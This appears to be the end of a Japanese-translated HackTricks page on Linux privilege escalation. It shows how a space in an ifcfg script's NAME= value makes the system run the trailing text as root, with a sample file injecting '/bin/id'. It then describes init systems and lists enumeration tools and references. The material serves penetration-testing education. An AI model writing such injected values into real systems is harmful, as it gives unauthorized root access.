何らかの理由で、ユーザーが_/etc/sysconfig/network-scripts_に`ifcf-<whatever>`スクリプトを**書き込む**ことができるか、既存のものを**調整**できる場合、あなたの**システムは侵害されています**。

ネットワークスクリプト、例えば_ifcg-eth0_はネットワーク接続に使用されます。これらは.iniファイルのように見えます。しかし、LinuxではNetwork Manager（dispatcher.d）によって\~ソースされます\~。

私の場合、これらのネットワークスクリプトで`NAME=`が正しく処理されていません。名前に**空白がある場合、システムは空白の後の部分を実行しようとします**。これは、**最初の空白の後のすべてがrootとして実行されることを意味します**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は **System V init (SysVinit)** のための **スクリプト** のホームです。これは **クラシックなLinuxサービス管理システム** であり、サービスを `start`、`stop`、`restart`、時には `reload` するためのスクリプトが含まれています。これらは直接実行することも、 `/etc/rc?.d/` に見られるシンボリックリンクを通じて実行することもできます。Redhatシステムの代替パスは `/etc/rc.d/init.d` です。

一方、 `/etc/init` は **Upstart** に関連しており、これはUbuntuによって導入された新しい **サービス管理** で、サービス管理タスクのための設定ファイルを使用します。Upstartへの移行にもかかわらず、SysVinitスクリプトはUpstartの設定とともに利用され続けており、Upstartには互換性レイヤーがあります。

**systemd** は現代の初期化およびサービスマネージャーとして登場し、オンデマンドでのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/` に、管理者の変更用に `/etc/systemd/system/` に整理されており、システム管理プロセスを効率化しています。

## Other Tricks

### NFS Privilege escalation

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** LinuxとMACのカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
